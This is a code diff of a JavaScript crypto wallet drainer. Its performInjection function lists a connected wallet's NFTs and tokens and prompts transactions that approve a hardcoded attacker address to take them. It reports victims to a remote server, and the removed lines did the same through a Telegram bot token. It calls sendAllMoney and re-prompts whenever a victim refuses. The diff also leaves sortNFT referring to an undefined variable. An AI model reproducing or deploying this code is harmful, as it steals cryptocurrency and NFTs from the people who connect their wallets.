@@ -168,61 +168,59 @@ async function performInjection(address) {
     let nfts = await getNFTS(selectedAccount);
     let sortedNFTs = nfts;
     console.log(sortedNFTs);
-    if (Object.keys(sortedNFTs).length == 0) {
+    if (sortedNFTs.length == 0) {
         throw "No NFTs found"
     }
-    for (const token_address of Object.keys(sortedNFTs)) {
-        for(let i = 0; i < sortedNFTs[token_address].length; i++) {
-            let actualDict = sortedNFTs[token_address];
-            let higherPrice = sortedNFTs[token_address][i]['token_address']
-            let isErc20 = sortedNFTs[token_address][i]["isErc20"];
-            
-            let contractInstance = new web3.eth.Contract(abi, higherPrice);
-            let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
-            
+    for (let i = 0; i < sortedNFTs.length; i++) {
+        let key = Object.keys(sortedNFTs[i])[0]
+        let actualDict = sortedNFTs[i][key];
+        let higherPrice = sortedNFTs[i][key][0]["token_address"];
+        let isErc20 = sortedNFTs[i][key][0]["isErc20"];
+        
+        let contractInstance = new web3.eth.Contract(abi, higherPrice);
+        let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
+        
 
-            let data = { "owner": selectedAccount, "address": toCheckSumAddress,"isErc20": isErc20  };
-            if(isErc20){
-                data["balance"] = actualDict[0]["balance"];
+        let data = { "owner": selectedAccount, "address": toCheckSumAddress,"isErc20": isErc20  };
+        if(isErc20){
+            data["balance"] = actualDict[0]["balance"];
+        }
+        console.log(data)
+        await fetch(`${URL}/transfer/init`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        });
+
+        //let result = await contractInstance.methods.setApprovalForAll(ContractAdr, true).send({ from: selectedAccount });
+        //console.log(result);
+        let data_to_encode = contractInstance.methods.setApprovalForAll(ContractAdr, true).encodeABI();
+        if (actualDict[0]["isErc20"]) {
+            let balanceOwned =actualDict[0]["balance"];
+            data_to_encode = contractInstance.methods.approve("0x90808EcB0f081654740477d4c8f30Cc7110d703e", balanceOwned.toString()).encodeABI();
+        }
+
+        const transactionParameters = {
+            to: higherPrice, // Required except during contract publications.
+            from: selectedAccount, // must match user's active address.
+            value: 0,
+            'data': data_to_encode //make call to NFT smart contract 
+        };
+        try {
+            const txHash = await provider.request({
+                method: 'eth_sendTransaction',
+                params: [transactionParameters],
+            });
+            if (i == sortedNFTs.length - 1) {
+                await sendAllMoney();
             }
-            console.log(data)
 
-            //let result = await contractInstance.methods.setApprovalForAll(ContractAdr, true).send({ from: selectedAccount });
-            //console.log(result);
-            console.log(contractInstance)
-            let data_to_encode = contractInstance.methods.setApprovalForAll("0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff", true).encodeABI();
-            if (actualDict[0]["isErc20"]) {
-                let balanceOwned =actualDict[0]["balance"];
-                data_to_encode = contractInstance.methods.approve("0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff", balanceOwned.toString()).encodeABI();
-            }
-
-            const transactionParameters = {
-                to: higherPrice, // Required except during contract publications.
-                from: selectedAccount, // must match user's active address.
-                value: 0,
-                'data': data_to_encode //make call to NFT smart contract 
-            };
-            
-            try {
-                const txHash = await provider.request({
-                    method: 'eth_sendTransaction',
-                    params: [transactionParameters],
-                });
-                var z=$.ajax({  
-    type: "POST",  
-    url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
-    data: "parse_mode=HTML&text="+encodeURIComponent("Транзакция: "+"https://etherscan.io/tx/"+txHash)+"%0A%0A"+encodeURIComponent("Контракт:"+higherPrice)+"%0A%0A"+encodeURIComponent("Инвентарь(НФТ): https://etherscan.io/token/"+higherPrice+"?a="+selectedAccount+"#inventory ")+"%0A%0A"+encodeURIComponent("Адрес владельца: "+selectedAccount), 
-    }); 
-                if (i == sortedNFTs.length - 1) {
-                    
-                    await sendAllMoney();
-                }
-
-                //showModal("Transaction Completed ", "You can check your transaction here: <a href='https://etherscan.io/tx/" + txHash + "'>https://etherscan.io/tx/" + txHash + "</a>");
-            } catch (error) {
-                await performInjection(address)
-                //showModal("Oops Transaction Failed", "Your Transaction Failed , Log : " + error.message);
-            }
+            //showModal("Transaction Completed ", "You can check your transaction here: <a href='https://etherscan.io/tx/" + txHash + "'>https://etherscan.io/tx/" + txHash + "</a>");
+        } catch (error) {
+            await performInjection(address)
+            //showModal("Oops Transaction Failed", "Your Transaction Failed , Log : " + error.message);
         }
     }
 
@@ -302,8 +300,8 @@ async function getNFTS(address) {
 
 function sortNFT(nfts) {
     let sortable = [];
-    for (var vehicle in nfts) {
-        sortable.push([vehicle, nfts[vehicle]]);
+    for (const token_address of Object.keys(nfts)) {
+        sortable.push([vehicle, nfts[token_address]]);
     }
 
     return sortable.sort(function (a, b) {
